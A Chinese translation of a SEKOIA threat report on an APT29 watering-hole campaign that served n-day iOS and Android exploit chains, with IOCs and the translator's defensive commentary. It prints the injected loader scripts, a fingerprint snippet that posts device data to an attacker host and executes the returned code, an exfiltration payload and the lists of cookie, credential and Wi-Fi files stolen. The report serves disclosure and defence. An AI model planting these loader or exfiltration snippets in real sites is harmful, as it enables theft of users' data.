---
title: 【微信】一次水坑，三条n-day链：SEKOIA溯源APT29对移动端的定向收割
source: https://mp.weixin.qq.com/s/vcf9Ou6rfnrJL7anMVqo-g
source_host: mp.weixin.qq.com
clip_date: 2026-11-23T17:56:11+08:00
trace_id: c067f000-1cf8-444f-9a60-abcbc949ef72
content_hash: 0b2a153e5c9de421d48382014299c4ea1a25407bdc16a4639a9c0897779b6abf
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 42175244-d011-8151-9a07-f68e7405a0c7
ioc:
  cves:
    - CVE-2024-27808
    - CVE-2024-27833
    - CVE-2024-27834
    - CVE-2025-14174
    - CVE-2025-24201
    - CVE-2025-27038
    - CVE-2025-31277
    - CVE-2025-43510
    - CVE-2025-43520
    - CVE-2025-43529
    - CVE-2026-20700
    - CVE-2026-3910
  cwes: []
  hashes:
    - 06c17b31d36838f3d29044784aa047d5c2d9174d3356c1211cf2599df677445f
    - 183d62d682aea8018491c8559544e8d6a9ab0e1abd05ecbb6c97daa4f438d2b8
    - 29d283ebd08d0cd3b2e6f4a67718d3d6e7a6be01d0613d716bce218dba57a928
    - 2ffb35e3f9e55286a930fb887e73764a913166648135fe0ca7551736d97d7bfa
    - 35c0cd19a7334b544c193e392bcd9a8f1d1f43cf6b61be5bf1d9e35537aff2ef
    - 387a7fb768db1350a9788d9704e7a72abe07152734e0ff026af72b417e36268c
    - 41e6fd33a30d36dabff9ea408d9766a6583edcc107968f6dc1499f2586381967
    - 621112712ec515e8791129c62feda8fff6654a0116882401609503cacc08054a
    - 69b6cb327a4d5da99399718f6a66f84de69f89425b0a31f2dcee0682f811596f
    - a7d2493df00565c21587b0cad2a9fe7ca1e5590acf796da6e499be0ffde44cc3
    - ae3241d96cc2d99538c7aff60f382cc8dac13859bcbea3ee84992d24d22a8108
    - bee3e014e3df87ddce0250b0985b87f6868a427a7b650a74b7ffedb9d57f3088
    - c170fda024183645c0aa681149304e50506509c3498bb6a9a5f5ced6aa73e5fa
  domains:
    - edge-ord.clouds-stacks.com
    - static.flux-telemetry.com
  tools: []
  techniques: []
---

**赛博生存指南** *2026年11月20日 16:58*

> 原文：https://www.sekoia.com/blog/poisoned-source-apt29-watering-holes-targets-mobile-devices-with-n-day-exploits  
> 作者：SEKOIA.io Threat Detection & Research（TDR）  
> 发布时间：2026-11-04  
> 翻译模型：GLM-5.3  
> 质量评分：★★★★½（4.5/5） ｜ 标签：国家级 APT 全链路 · 移动端 / 灰产生态 · 漏洞利用

**AI 摘要**：SEKOIA TDR 披露一起大规模水坑行动，中高置信度归因于 APT29：直接注入美国、乌克兰、捷克、保加利亚多家高价值网站，注册仿冒域名做 AiTM 反代，还供应链攻陷了乌克兰 Plerdy 分析组件一周（2026-08-27 至 09-03），让数千网站被动挂马。三条 n-day 利用链分别打 iOS 16.7（偷 cookie）、iOS 18.5（整机数据，复用 CSV 厂商的 DarkSword 套件）和 Android Chrome 139-145（cookie 加 Wi-Fi 密码）——全部是已修补漏洞，系统更新即免疫。指纹脚本 394 个字段几乎不影响投放决策，61 个采集器更像是过度工程。

APT29 上一次出现在本仓库视野里还是借 GTIG 的报告，这次 SEKOIA 给出的是一手调查全程：从乌克兰天然气公司页面里一行 `<script>` 开始，一路挖到仿冒美国建国 250 周年官网和伦敦 OW O 酒店（泽连斯基住过的那家）的反代水坑，再到 Plerdy 供应链——三条感染线最终汇进同一套 exploit kit。对移动端安全读者，这篇的价值在于把「国家级攻击者 + 商业间谍软件厂（CSV）的二手 n-day」这条供应链讲透了：APT29 没有自研漏洞，买现成的就够打高价值目标。归因部分的那段「前次行动残留痕迹」推理也值得细读，是真实 CTI 工作的样本。

![Poisoned Source 行动横幅](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/11a444873dff5283.jpg)

## 引言

2026 年 10 月中旬，SEKOIA 的威胁检测与研究团队（TDR）发现一起大规模水坑行动：美国、乌克兰、捷克和保加利亚的多家高知名度网站被入侵或被克隆。与此同时，我们评估认为该入侵组织还对一家乌克兰网站分析服务实施了供应链攻击，让数百家合法网站及其访客在整整一周里暴露在它的 exploit kit 面前。

这轮行动依赖三种感染途径：对合法网站的直接 JavaScript 注入、类 Adversary-in-the-Middle（AiTM）的仿冒域名，以及对乌克兰网站分析服务的供应链攻击。三种途径投递的都是同一款 payload——一段代码注入，加载外部脚本对访客的浏览器和设备做画像。投放服务器随后按移动端系统和浏览器版本，无交互地分发平台专属的 n-day 利用链。其中一条链是 DarkSword——疑似商业间谍软件厂商（Commercial Surveillance Vendor，CSV）开发的 iOS exploit kit，2026 年 9 月被上传到 VirusTotal。最终 payload 从 iOS 设备外传 cookie 或整机数据，从 Android 设备外传 Chrome 数据和 Wi-Fi 密码，均不建立持久化。

基于技术重叠与观察到的作业模式，我们以中高置信度评估，这轮行动由 APT29（也被追踪为 Midnight Blizzard、Cozy Bear、The Dukes）实施——一个被广泛归因于俄罗斯对外情报局（SVR）的入侵组织。

我们正与受影响国家的 CERT 协调，支持受害者识别，并评估打断水坑基础设施的选项。

本报告概述我们对这轮行动的技术调查，详述投放管线、受害者画像逻辑与关联基础设施。

## 感染途径

调查始于乌克兰一家天然气生产公司网站顶部发现的恶意 JavaScript 引用——指向攻击者控制的 exploit 投放服务器。

顺着初始发现，我们识别出更多水坑行动，既有被入侵的合法网站，也有攻击者自建的域名。当入侵组织无法直接攻陷某个合法网站时，就转用类 Adversary-in-the-Middle（AiTM）手法：注册相似域名，实时改写 HTML 内容，在每页底部注入恶意 JavaScript。

随着调查推进，我们观察到大量网站的请求涌向 exploit 投放服务器，其中一些与该组织的既定目标没有明显的战略相关性。对这些「不相关」网站的进一步分析揭示了共同点：Plerdy SEO Tracker——被入侵组织攻陷一周的第三方组件。

本节详述该组织用来把目标用户重定向到 exploit 投放服务器的各种感染途径。

### 直接入侵合法网站

乌克兰天然气公司的感染链始于网站主模板里的 JavaScript 注入。页面及依赖加载完毕后，脚本动态注入新元素加载外部文件——入侵组织称其为 UltimateFingerprinter 脚本——托管在 static.flux-telemetry\[.\]com，解析到 109.104.106\[.\]107（AS395092）。

注入脚本美化后如下：

```html
<script>
 window.onload = function () {
   const script = document.createElement('script');
   script.src = 'hxxps://static.flux-telemetry[.]com/module/5b4c8fea5cbcee273e8d830f52-temfp.js';
   document.body.appendChild(script);
 }
</script>
```

调查中还确认了多个其他被入侵的网站，包括一家代表美国化工企业的行业协会官网，和一个欧洲极右翼政党网站。

在另一些网站上，入侵组织没有改页面模板，而是把恶意代码追加到既有合法 JavaScript 文件末尾。例如在一个保加利亚军事相关网站上，入侵组织篡改了既有 JavaScript 库注入同样的恶意代码。

最后，部分被入侵网站的战略价值尚不明确。我们以低置信度评估，这些网站可能是为打击特定个人而入侵的，并非更宏观战略瞄准的一环。

### AiTM 式手法

我们识别出两个由入侵组织搭建、用作反向代理的高知名度网站：充当访客与真实合法网站之间的 Adversary-in-the-Middle（AiTM），实时修补 HTML 源码，在网页底部注入恶意 JavaScript 引用。

第一个网站 america250\[.\]holiday，是 america250.org 的反代——后者受 Cloudflare 保护。America250.org 是 America250 的官网，这是纪念美国独立 250 周年的国家倡议。

我们评估认为，入侵组织可能是看中了这个网站与高规格国家庆典的关联，可能借活动名义发起以邀请函为主题的鱼叉钓鱼。

第二个网站 theowo\[.\]club（现已下线），曾是伦敦 OW O 酒店（Raffles London at The OWO）官网的反代——一家入驻历史建筑旧战争办公室（Old War Office）的顶级豪华酒店。

这家酒店的地理位置值得注意：它紧邻英国部分最敏感的政府机构，包括国防部，以及英国首相官邸兼办公室唐宁街 10 号。

通过冒充 OW O 酒店做水坑，入侵组织可能意在借定向鱼叉钓鱼打击外交代表团和贵宾。近期的公开报道显示，乌克兰总统泽连斯基 10 月 14 日访问伦敦期间就下榻于此。

调查中识别的 AiTM 网站如下：

| 域名  | IP 地址 | 托管商 |
| --- | --- | --- |
| america250\[.\]holiday | 192.121.46\[.\]25 | EDIS GmbH（AS9009） |
| theowo\[.\]club | 188.190.17\[.\]232 | EDIS GmbH（AS57169） |

### 经 Plerdy SEO Tracker 的大规模水坑

2026 年 8 月 27 日至 9 月 3 日，入侵组织攻陷了托管在 a.plerdy\[.\]com 域名下的乌克兰 Plerdy 分析追踪组件——数千家网站都在加载它，其中绝大多数是乌克兰网站。

攻击者是想打击特定网站的访客，还是想尽可能多地感染未打补丁的移动设备、先无差别收集数据再筛选有价值信息，目前不清楚。

但可以确定，其中不少网站在俄乌战争背景下很可能吸引高价值或具战略重要性的访客。这场供应链攻击蔓延到了高价值目标，例如军队、特种部队和军事装备（弹道导弹、无人机）相关网站。

在这一周里，入侵组织向合法追踪文件 hxxps://a.plerdy\[.\]com/public/js/click/main.js 注入恶意代码，让访客在加载正常 Plerdy 脚本的同时，也加载入侵组织的指纹脚本。去混淆后的注入代码如下：

```javascript
window.onload = function () {
  const _0x3af331 = document.createElement("script");
  _0x3af331.src = "hxxps://edge-ord.clouds-stacks[.]com/module/5b4c8fea5cbcee273e8d830f52-temfp.js";
  document.body.appendChild(_0x3af331);
};
```

我们没能取到 edge-ord.clouds-stacks\[.\]com 上的脚本——它已下线。但其文件名（5b4c8fea5cbcee273e8d830f52-temfp.js）与乌克兰天然气公司那边取到的脚本完全一致。据此，我们以中高置信度评估，这就是大规模水坑攻击用的同一份指纹脚本。

值得注意的是，edge-ord.clouds-stacks\[.\]com 托管的并非入侵组织命名为 UltimateFingerprinter 的最终指纹脚本，而是经 HTTP 重定向把请求转到其他投放服务器（如 ads-it-assets\[.\]com、cdn.adv-static\[.\]com、wpvortex-mod\[.\]com 和 assets-int\[.\]com）。

我们以中等置信度评估，入侵组织把这个域名当负载均衡器用，把流量分摊到多个投放基础设施上，缓解请求量导致的宕机风险。

## 指纹脚本（UltimateFingerprinter）

UltimateFingerprinter 是定制 JavaScript payload，用来获取用户的操作系统和浏览器版本以分发对应 exploit，并收集详细的用户设备指纹。虽然文件名 5b4c8fea5cbcee273e8d830f52-temfp.js 看似随机生成，但在我们观察到的所有受害者中完全一致。

该脚本被追加在一个压缩版 AngularJS 库后面，库代码作为死代码占了文件总体积（2.3 MB）的约 98%。我们认为这个手法有两个潜在目的：让大语言模型（LLM）因超出上下文窗口而难以自动分析，或借知名 JavaScript 库的外壳让恶意脚本显得合法。

UltimateFingerprinter 从 61 个采集器收集访客浏览器与设备配置，合计构造 394 个 JSON 字段。收集字段的例子：

-   经典设备字段：canvas、audio、webgl、fonts、css、math、screen
    
-   沙箱检测：webrtc、mediaDevices、battery、sensors、network、performance timing
    
-   Apple 专属：iosFeatures、macFeatures、safariExtensions、touchGestures
    
-   现代 Web API：USB、NFC、Bluetooth、IDLE 检测、compute pressure、shape detection、payment
    

收集到的值打包成 JSON 对象，发送到第二个带随机 nonce 的 URL（下面 JS 片段中加粗处）。若提交的数据符合攻击者的目标筛选与利用条件，该端点返回 JavaScript exploit 代码执行：

```javascript
(async function(){
  const adfp = await collectAndDisplayFingerprint();
  let res = await fetch('https://static.flux-telemetry.com/api/uGmlx2pmMHU1jq7wZU2QWgeC28vbXalf/v1', {method: 'POST', headers: { 'Content-Type': 'application/json'}, body: JSON.stringify(adfp)});
  try {
    const script = document.createElement("script");
    script.text = await res.text();
    document.head.appendChild(script);
  }
  catch{};
})();
```

尽管收集了这么多字段，指纹对 exploit 投放几乎不起作用。唯一的例外是对设备配置的基础检查：三个字段值不合理时会阻断投放——屏幕宽高（如 99999 这种非手机尺寸）以及 `navigator.maxTouchPoints` 为 0（非触屏设备）。这些情况下，投放服务器返回 200 OK 空响应，不给任何 payload。

收集如此庞大的指纹究竟为何，仍不清楚。它确实详尽描绘了访客设备，但我们没有观察到任何证据表明这些数据影响了 exploit 投放，或在感染链后续环节被复用。

## Exploit 分析

调查期间，我们用不同浏览器画像测试 static\[.\]flux-telemetry\[.\]com 的指纹端点，以取回投给访客的 exploit。由此获得三条完整利用链（下称 A、B、C）及其最终 payload，同时覆盖 Android 和 iOS。发现汇总如下：

| 链   | 利用与目标 | 瞄准  |
| --- | --- | --- |
| A   |     | iOS 16.7 |
| B   | CVE-2025-43529、CVE-2026-20700、CVE-2025-14174、CVE-2025-43510、CVE-2025-43520。收集整机数据 | iOS 18.5 |
| C   |     | Android Chrome 139-145（143 除外） |

三条利用链完全依赖已知、已修补的漏洞。没有零日，也无法攻陷完全更新的设备。每个缺陷都在行动开始前被相应厂商修复。这次行动用 n-day 打未打补丁的设备——操作系统保持最新的用户对这类攻击免疫。

### A 链：偷 iOS cookie

| 类型  | 值   |
| --- | --- |
| sha256 | bee3e014e3df87ddce0250b0985b87f6868a427a7b650a74b7ffedb9d57f3088 |
| 语言  | JavaScript |
| 体积  | 101K |

对 iOS 16.7（该链应可覆盖 16.0 至 17.4），服务器下发单个 JavaScript 文件，内含利用代码和最终 payload。脚本最先设置标记 cookie `VDGH_TOKEN_REF` ——硬编码值恒定不变，已存在则直接退出。这是防重放机制，防止同一受害者被利用两次。不知为何，过期时间写的是「days=1」，但计算有误，实际 1 分钟就过期——只能防止极快的重复感染。

该场景串联两个零点击（zero-click）CVE 利用，在目标设备上拿到足够权限执行偷 cookie 的 JavaScript 代码。

**第一阶段：初始 RCE，DarkSword 的 CVE-2025-43529。** 样本使用的 RCE（CVE-2025-43529）与泄露的 DarkSword exploit kit 里那个相同，但属于重实现。文件里还有另外两个利用——AccessCase UAF（CVE-2024-27808）和 SBFX 溢出（CVE-2024-27833）——作为不可达死代码残留，应该来自套件的早期版本。

**第二阶段：PAC 绕过（CVE-2024-27834）。** 在现代 Apple Silicon 上，只拿到渲染进程内的任意读写已不足以完成利用。该架构用 Pointer Authentication Code（PAC）对控制流指针做密码学签名。因此攻击者即使能操纵内存，也无法简单覆写函数指针劫持执行流——触发签名错误的指针只会让进程崩溃，而不是执行 payload。为绕过这层缓解、伪造任意代码执行所需的有效指针，利用链加入了基于 CVE-2024-27834 的 PAC 绕过。

**第三阶段：偷 cookie。** 两个 JavaScript 函数完成这个过程：

-   `ASDhdhashdasads()`
    
    （PID 扫描）：对每个 pid 调用 `invoke(sandbox_container_path_for_pid, pid, buf, 4096)` ，让内核把容器路径写进它控制的堆缓冲区。
    
-   `AHSDhdashashs()`
    
    （收集器）：对每个解析出的容器路径调用 `invoke(fopen, pathptr, "rb")` ，再 `invoke(read, fd, buf, …)` ，检查 magic 是否为 "cook"，读文件进缓冲区，然后用 exploit 自己的读原语（readp64/read32）把字节取出、重组成 JS 字符串。
    

只要应用在运行、cookie 存在 `/private/var/mobile/Containers/Data/Application/<UUID>/Library/Cookies/Cookies.binarycookies` ，这个方法就能偷到 Safari 之外的 cookie。

外传也是纯 JS： `print()` 构造 only_cookies JSON：

```javascript
bodyj = {
  "category": "only_cookies",
  "data": msg, // ← the actual stolen data
  "description": "only_cookies",
  "deviceUUID": genUUID(),
  "path": "only_cookies",
  "size": 2097152
}
```

最后经 `fetch()` POST 到 ad.starx-net\[.\]com:8881/telemetry/v12。

### B 链：整机数据外传

通过指纹门槛、指纹被接受后，恶意软件从 hxxps://ad.starx-net\[.\]com/api/ /v1 依次下载 /v1、/v2、/v3 多个阶段。

| 字段  | 值   |
| --- | --- |
| /v1 sha256 | 35c0cd19a7334b544c193e392bcd9a8f1d1f43cf6b61be5bf1d9e35537aff2ef |
| /v2 sha256 | 621112712ec515e8791129c62feda8fff6654a0116882401609503cacc08054a |
| /v3 sha256 | 69b6cb327a4d5da99399718f6a66f84de69f89425b0a31f2dcee0682f811596f |
| 语言  | JavaScript |

这条完整利用链就是 DarkSword。我们对照了 DarkSword 套件和 Ciolino 的分析。

**第一阶段（/v1）：初始 RCE。** 以与 A 链完全相同的 `VDGH_TOKEN_REF` cookie 防重复感染开场，同样的 days/minute 混用。先用 WebContent RCE CVE-2025-43529，再以 CVE-2026-20700 做 PAC 绕过。

**第二阶段（/v2）：沙箱逃逸。** 现代 WebKit 架构里，渲染进程跑在受限沙箱内，无法直接访问系统资源、文件系统和敏感用户数据。因此只在渲染进程拿到 RCE 不足以完全攻陷设备或全面收集数据——必须利用沙箱逃逸漏洞突破隔离环境、提权、触达底层系统 IPC 机制或内核接口。本阶段利用链使用 CVE-2025-14174（sbx0）接 CVE-2025-43510（sbx1），实现与 VirusTotal 上那份 DarkSword 套件几乎一致。

**第三阶段（/v3）：提权与后渗透。** 利用链用 CVE-2025-43520 拿内核读写能力，与 Ciolino 文章的第二阶段一致。权限到手后，部署后渗透收割器，把数据外传到 ad.starx-net\[.\]com。套件还提供 CVE-2025-31277 作为备用入口、CVE-2025-24201 作为备用逃逸，本次投放均未使用。

后渗透 payload 实际上是在「收割整台手机」。先取原生消息库：sms.db 里的短信和 iMessage、邮件索引（Envelope Index 和 Protected Index）、语音信箱。然后是大型第三方即时通讯：下载 WhatsApp 和 Telegram 数据库。最后从 Keychain 拉存储的密码和令牌，从 Accounts3.sqlite 取账户凭据，从 wifi_passwords.txt 取 Wi-Fi PSK。

消息内容之外，它还横扫通信元数据：通讯录、通话记录、日历和备忘录、Safari 的 History.db 和 cookie（Cookies.binarycookies 与 /var/mobile/Cookies/）——这是它与 iOS 16 链唯一重叠的目标。它还伸进 Apple 的端上智能：应用 / 使用时间线、routined 和 locationd 位置缓存、健康数据。最后是媒体：照片库（Media/DCIM 与 PhotoData）和 iCloud Drive。

外传数据发往 hxxps://ad.starx-net\[.\]com:8881/telemetry/v12，与 A 链端点完全相同。

### C 链：偷 Android Chrome cookie 与已存 Wi-Fi

| 字段  | 值   |
| --- | --- |
| sha256 v139-v144 | ae3241d96cc2d99538c7aff60f382cc8dac13859bcbea3ee84992d24d22a8108 |
| sha256 v145 | 41e6fd33a30d36dabff9ea408d9766a6583edcc107968f6dc1499f2586381967 |
| sha256 shellcode | 183d62d682aea8018491c8559544e8d6a9ab0e1abd05ecbb6c97daa4f438d2b8 |
| sha256 AndroSnitch | 387a7fb768db1350a9788d9704e7a72abe07152734e0ff026af72b417e36268c |

这条链瞄准运行未打补丁 Chrome 的 Android 设备。投放服务器只给 Chrome 139.0.0.0 至 145.0.0 下发 exploit，明确排除 143，原因不明。给 139-144 和给 145 的 payload 相同，只有 GPU 利用部分的 shellcode 疑似重新编译过。两个变体最终用同样的 CVE、投递同样的最终 payload。

**第一阶段：初始 RCE。** Android 利用链没有 cookie 校验机制，无法防止连续两次感染。脚本直接利用 CVE-2026-3910 在 Chrome 渲染进程拿到代码执行。

**第二阶段：沙箱逃逸与提权。** 前面的 RCE 用来加载 shellcode。它由小型 loader、stager 和一个共享库组成——后者利用 Adreno 驱动里的 CVE-2025-27038 逃出浏览器沙箱，得以启动更高权限的 shellcode。利用过程中有设备检查：检测到 SM-S938B（三星 Galaxy S25 Ultra）就停止利用。

**第三阶段：AndroSnitch。** AndroSnitch shellcode 的 stager 和 loader 与前者相同，差异在携带的共享库：内部名 `libexploit.so` ，只有 16 个函数，唯一目的是收集 Chrome 数据和 Wi-Fi 密码：

-   /data/data/com.android.chrome/app_chrome/Default/Cookies
    
-   /data/data/com.android.chrome/app_chrome/Default/Login Data
    
-   /data/data/com.android.chrome/app_chrome/Default/History
    
-   /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml
    
-   /data/misc/apns/0/WifiConfigStore.xml
    

收集完毕后构造两个头——Filename（值为上面收集的文件）和 X-Device-Id（样本内硬编码）——依旧用 libcurl 发往 hxxps://ad.starx-net\[.\]com:8881/telemetry/v12。

我们把它命名为 AndroSnitch，因为它与 Google TAG 2024 年报告中的样本相似：目标文件相同，只是 AndroSnitch 里的 WifiConfigStore 替代了当年 AndroSnatch 的 TrustTokens。两者的 `.comment` 段显示同一工具链（Clang/LLD 14.0.7，但这很容易伪造），都用 libcurl 外传、都带硬编码令牌。这些相似性可能意味着血缘关系，但样本和能力太小，无法下定论。

## 归因假设：把行动溯源到 APT29

调查期间，我们与网站受影响国家的 CERT 合作。有意思的是，他们告诉我们：一个被入侵网站（非经 Plerdy 第三方服务）的后端文件里，留有另一起恶意活动的痕迹。据合作方说法，这些痕迹与一份私有报告吻合——该报告包含 2025 年一起已归因于 APT29 的水坑行动的 TTP 与 IOC。这起独立活动的一个 IOC 已不再活跃，尽管网站文件里仍注入着它。我们因此评估两种情形：要么操作者没有清除早期行动的残留痕迹，要么操作者在入侵网站时误注入了那起行动遗留的恶意组件。

分析利用链的同时，我们也与 Google TAG 共享了部分发现。他们确认，本次行动使用的框架与 2024 年 APT29 针对蒙古政府网站的水坑行动相似。两场行动目标相同：偷 cookie。区别在于 2024 年那起用了硬编码过滤器、只打特定网站；本轮没有这种过滤，浏览器里的任何 cookie 都收，部分利用链还收整机数据。

据 Google TAG，2024 年那批 exploit 与 NSO Group、Intellexa 等商业间谍软件厂商（CSV）用的是同一批。TAG 在报告中表示，不确定 APT29 如何获得这些 exploit。我们对利用链的分析支持「exploit 来自第三方」的判断。例如 A 链 payload 的投放服务器只过滤 iOS 16.7 / 16.7.10，但 exploit 实际覆盖 16.0 到 17.4 更宽的范围。这种不匹配说明操作者是在复用 exploit，没有把过滤部分改成与当前投放链匹配。

技术重叠之外，受害者分布也支持这一评估。受害者横跨欧美，尤其聚焦乌克兰，与俄罗斯利益一致。另外，攻击者控制的域名分布在多家托管商——这是此前观察到的基础设施模式，包括 APT29 过去使用 Cobalt Strike 的 Cs2modrewrite。最后，我们观察到对一个捷克极右翼运动网站的入侵，与该入侵组织历史上打击欧洲政党的做法吻合。

综合这些要素，我们以中高置信度评估：这轮水坑行动背后的入侵组织是 APT29，或至少是它的某个 subgroup。

## 结论

这轮我们以中高置信度关联到 APT29 的水坑行动，把多种 Web 投放途径与瞄准 Android、iOS 设备的 n-day 移动利用链组合在一起。

在直接入侵的网站中，分析没有显示出单一行业瞄准模式。受害者分布聚焦乌克兰和美国，但像澳大利亚一家诊所这类无关实体的出现，让宽泛的战略解读变得复杂。

不过我们评估认为，这些网站可能是依据我们无法看到的瞄准情报、为画像和感染特定个人而挑选的。操作者用类 AiTM 手法拦截与外交或高规格活动相关的访客，是相应的能力补充。

与此同时，2026 年 8 月 27 日至 9 月 3 日对乌克兰分析服务 Plerdy 为期一周的攻陷，把行动的受害者面显著扩大到数千个以乌克兰为主的网站。使用该追踪器的若干网站与乌克兰国防部门和军事招募直接相关。我们评估，入侵组织可能是想在依赖 Plerdy 脚本的高价值乌克兰目标上直接注入失败后，把攻陷第三方供应商作为替代投放途径；但也可能只是撒张更大的网，钓有价值的凭据。

这次行动也再次确认：国家级入侵组织在持续复用 DarkSword 这类 CSV 移动 exploit 框架。打包好的 n-day 利用链降低了高级移动利用的成本和技术门槛。长期看，我们评估 CSV exploit 在国家级入侵组织间的扩散和复用会更频繁。

TDR 团队将继续通过内部监测工具追踪水坑基础设施，及早识别新行动、记录国家级入侵组织演进的 TTP。

最后，感谢 CERT-UA 在调查中的协作与洞察，感谢 Google TAG 协助识别 exploit 及相关 CVE。

## 失陷指标

部分指标（含投放与外传主机、YARA 规则和被入侵网站明细）未在本文公开，可在 Sekoia CTI 获取。各国 CERT 与执法机构可经 TLP:AMBER 获取 IOC 与样本，联系 tdr \[ at \] sekoia \[ dot \] com。

### AiTM 仿冒网站

| 域名  | 创建日期 | 恶意投放域名 |
| --- | --- | --- |
| theowo\[.\]club | 2026-06-18 | static.flux-telemetry\[.\]com |
| america250\[.\]holiday | 2026-05-19 | adsprism-stat\[.\]com |

### 投放与外传主机

| 域名  | 类型  | 创建日期 | IPv4 | ASN / 名称 |
| --- | --- | --- | --- | --- |
| static.flux-telemetry\[.\]com | 投放  | 2026-04-02 | 109.104.106\[.\]107 | AS395092 / Shock Hosting LLC |
| edge-ord.clouds-stacks\[.\]com | 投放  | 2026-08-26 | 95.133.231\[.\]28 | AS219399 / servinga GmbH |
| ad.starx-net\[.\]com | 外传  | 2026-04-03 | 195.58.140\[.\]105 | AS395092 / Shock Hosting LLC |

### 哈希

| 哈希  | 标识  |
| --- | --- |
| a7d2493df00565c21587b0cad2a9fe7ca1e5590acf796da6e499be0ffde44cc3 | Class-A-Stage1 |
| bee3e014e3df87ddce0250b0985b87f6868a427a7b650a74b7ffedb9d57f3088 | Class-A-Stage2 |
| c170fda024183645c0aa681149304e50506509c3498bb6a9a5f5ced6aa73e5fa | Class-B-Stage1 |
| 2ffb35e3f9e55286a930fb887e73764a913166648135fe0ca7551736d97d7bfa | Class-B-Stage2 |
| 69b6cb327a4d5da99399718f6a66f84de69f89425b0a31f2dcee0682f811596f | Class-B-Stage3 |
| 29d283ebd08d0cd3b2e6f4a67718d3d6e7a6be01d0613d716bce218dba57a928 | Class-C-Stage1-JS |
| 06c17b31d36838f3d29044784aa047d5c2d9174d3356c1211cf2599df677445f | Class-C-Stage2-JS |
| 183d62d682aea8018491c8559544e8d6a9ab0e1abd05ecbb6c97daa4f438d2b8 | Class-C-Stage2-CVE-2025-27038 |
| 387a7fb768db1350a9788d9704e7a72abe07152734e0ff026af72b417e36268c | AndroSnitch |

## 译者补充：几点解读与延伸

**「国家级组织买商业间谍软件的二手 exploit」是这篇最重要的判断。** APT29 没有烧自己的 0day 库存——三条链全部是 n-day，iOS 侧直接复用 2026 年 9 月才出现在 VirusTotal 的 DarkSword 套件（疑似 CSV 出品），连「投放过滤只认 16.7、exploit 实际覆盖 16.0-17.4」这种复用痕迹都懒得改。SEKOIA 结尾的判断值得引用：这种复用会越来越频繁。对移动端防御，含义很直接：威胁模型里「国家级对手」和「商业间谍软件」要按同一套补丁纪律对待——及时更新系统就能挡住这整篇报告里的全部攻击，这话是字面意思。

**指纹脚本的 394 个字段是块「装饰性装甲」。** 61 个采集器、2.3 MB 体积（98% 是 AngularJS 死代码）、结果只有三个字段真正参与投放决策。SEKOIA 给出两个可能解释：撑爆 LLM 分析的上下文窗口，或者借知名库外壳伪装。这两条对做沙箱和自动化分析的团队都是实打实的对抗趋势——大文件、大依赖、低信噪比，本来就是在消耗分析侧的预算。

**归因部分的方法论比结论更有教学价值。** 三条证据线各自都不算铁证：网站后端的 2025 年 APT29 残留痕迹（可能是没清理干净，也可能是误注入）、Google TAG 认出的 2024 年蒙古水坑同款框架、受害者画像与基础设施习惯。三条合起来才撑起「中高置信度」。读者做事件归因时可以对照：单一维度的相似性（哪怕 exploit 完全同款）只能说明工具来源，组织归属需要独立证据线交叉。

**对网站运营方的提示：第三方脚本是你的攻击面。** Plerdy 供应链一节说明，主站自己没被入侵也可能伤到访客——你引入的每一个第三方组件都是替别人做的安全决策。网站侧能做的是收敛第三方脚本数量、加 SRI（subresource integrity）校验；访客侧则是浏览器把无关站点脚本当沙箱对待。国内站点大量使用统计 / 热图类第三方脚本，同类手法完全可复制。

## 参考

-   Poisoned Source: APT29 Watering Holes Target Mobile Devices with n-day Exploits：https://www.sekoia.com/blog/poisoned-source-apt29-watering-holes-targets-mobile-devices-with-n-day-exploits
    

好文推荐 · 目录
